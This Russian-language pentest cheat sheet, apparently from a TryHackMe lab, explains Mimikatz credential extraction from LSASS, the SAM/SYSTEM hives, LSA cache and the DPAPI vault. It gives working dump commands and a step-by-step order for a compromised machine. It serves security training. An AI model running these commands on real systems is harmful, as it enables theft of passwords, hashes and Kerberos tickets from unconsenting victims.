# MIMIKATZ — ИЗВЛЕЧЕНИЕ УЧЕТНЫХ ДАННЫХ

## Что это

Mimikatz — пост-эксплуатационный инструмент для извлечения credentials из памяти Windows, реестра и DPAPI.

---

# ВАЖНЫЕ НЮАНСЫ (ПЕНТЕСТ-ЧЕКЛИСТ)

1. LSASS память — ТОЛЬКО АКТИВНЫЕ СЕССИИ
   Если пользователь залогинился и вышел, его данные ИСЧЕЗНУТ из памяти.
   Чтобы получить креды пользователя, нужно поймать момент, когда у него есть активная сессия.

2. SAM + SYSTEM — ЛОКАЛЬНЫЕ УЧЕТКИ
   Не дают доменных пользователей.
   Нужны для pass-the-hash между локальными учетками.

3. LSA Secrets — КЭШ ДЛЯ ОФЛАЙН ВХОДА
   Хранит кэшированные доменные credentials (MSCacheV2).
   Позволяет залогиниться на ноутбуке без связи с DC.

4. DPAPI Vault — ЗАВИСИТ ОТ КОНТЕКСТА ПОЛЬЗОВАТЕЛЯ
   Чтобы расшифровать vault пользователя, нужно:
   - Быть под этим пользователем
   - Иметь его пароль или мастер-ключ
   - Или иметь SYSTEM и специфические права

5. НУЖНЫ ПРАВА АДМИНА (или SYSTEM)
   Большинство команд Mimikatz требуют Administrator или SYSTEM.

---

# 1. LSASS MEMORY (Активные сессии)

## Что дает

NTLM хэши, Kerberos билеты, иногда plaintext пароли.

## Нюанс

Только пользователи, у которых ЕСТЬ АКТИВНАЯ СЕССИЯ на момент дампа.
Если пользователь залогинился и вышел — его креды НЕ будут в памяти.

## Команды

# Включить SeDebugPrivilege
privilege::debug

# Дамп всех активных сессий
sekurlsa::logonpasswords

## Пример вывода

- msv — NTLM хэш
- wdigest — plaintext пароль (если доступен)
- kerberos — билеты
- credman — сохраненные креды из vault

---

# 2. SAM + SYSTEM HIVES (Локальные пользователи)

## Что дает

Хэши ЛОКАЛЬНЫХ пользователей (не доменных).

## Нюансы

- Не дает доменных учеток
- Нужен SYSTEM доступ
- Расшифровка требует BootKey из SYSTEM hive

## Экспорт hive (PowerShell админ)

reg save HKLM\SAM C:\SAM
reg save HKLM\SYSTEM C:\SYSTEM

## Команда Mimikatz

lsadump::sam /sam:C:\SAM /system:C:\SYSTEM

## Альтернатива без сохранения файлов

lsadump::sam

---

# 3. LSA SECRETS (Кэшированные доменные креды)

## Что дает

- Cached доменные credentials (MSCacheV2) — позволяют войти офлайн
- Пароли от scheduled tasks и служб

## Нюансы

- Нужен SYSTEM доступ
- Cached credentials хранятся всегда, даже если пользователь не активен

## Команды

# Поднять до SYSTEM
privilege::debug
token::elevate

# Дамп кэша
lsadump::cache

## Что значит MSCacheV2

Хэши доменных пользователей, сохраненные для офлайн входа.
Ограничены: работают только на этом компьютере.
Можно взломать офлайн.

---

# 4. DPAPI VAULT (Сохраненные пароли приложений)

## Что дает

Пароли из:
- Windows Credentials (RDP, сетевые шары)
- Web Credentials (браузеры)

## Нюансы (ВАЖНО)

- Vault пользователя может расшифровать ТОЛЬКО этот пользователь
- Или SYSTEM + специфические права
- Креды сервисных аккаунтов (svc-app) НЕ расшифруются, если ты не под этим аккаунтом

## Команды

# Список vaults
vault::list

# Экспорт всех credentials
vault::cred /export

## Почему некоторые credentials не расшифровываются

В выводе vault::cred ты можешь увидеть:
TargetName : WRK
UserName   : TRYHACKME\svc-app
Credential : (пусто или звездочки)

Это значит, что vault зашифрован мастер-ключом пользователя svc-app.
Без его пароля или сессии — расшифровать нельзя.

---

# 5. КЭШИРОВАННЫЕ КРЕДЫ ЧЕРЕЗ SYSTEM (token::elevate)

## Зачем это

Некоторые данные в LSA и SAM доступны только из контекста SYSTEM.

## Команды

privilege::debug
token::elevate   # поднять до SYSTEM
lsadump::cache   # теперь видно кэш

---

# ШПАРГАЛКА ПО MIMIKATZ

# LSASS (активные сессии)
privilege::debug
sekurlsa::logonpasswords

# SAM (локальные пользователи)
lsadump::sam

# LSA Secrets (кэш)
privilege::debug
token::elevate
lsadump::cache

# DPAPI Vault
vault::list
vault::cred /export

# Сохранить и загрузить минидамп LSASS (для офлайн анализа)
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

---

# КЛЮЧЕВЫЕ ВЫВОДЫ ДЛЯ ПЕНТЕСТА

1. LSASS — только активные сессии (время имеет значение)
2. SAM — только локальные учетки (бесполезны для домена, но могут помочь с локальным движением)
3. LSA cache — кэшированные доменные креды (можно взломать офлайн)
4. DPAPI vault — зависит от контекста пользователя
5. SYSTEM нужен для cache и sam

# Порядок действий на скомпрометированной машине

1. Проверить активные сессии: sekurlsa::logonpasswords
2. Сохранить SAM и SYSTEM для офлайн анализа
3. Поднять до SYSTEM и дампнуть cache (lsadump::cache)
4. Посмотреть vault (vault::list, vault::cred /export)
5. Сохранить минидамп LSASS для офлайн анализа

# НЮАНСЫ MIMIKATZ (ЧТО ВАЖНО ЗАПОМНИТЬ)

1. sekurlsa::logonpasswords → ТОЛЬКО АКТИВНЫЕ СЕССИИ
   - Не показывает историю логинов
   - Если пользователь вышел из системы → его креды исчезли из памяти

2. token::elevate → НУЖЕН ДЛЯ SYSTEM
   - Без этого lsadump::cache и lsadump::sam могут не работать
   - Работает только если у текущего пользователя есть права на повышение

3. DPAPI vault → КОНТЕКСТ ИМЕЕТ ЗНАЧЕНИЕ
   - Пароли из vault пользователя A не расшифруются под пользователем B
   - Для расшифровки нужно быть тем пользователем или знать его пароль

4. MSCache2 → ХРАНИТСЯ НА ДИСКЕ
   - Даже если пользователь никогда не заходил на эту машину, его креды могут быть в кэше (если кто-то логинился под ним)
   - Извлекается через lsadump::cache с правами SYSTEM

5. Mimikatz требует АДМИНСКИХ ПРАВ
   - Большинство команд не работают из-под обычного пользователя
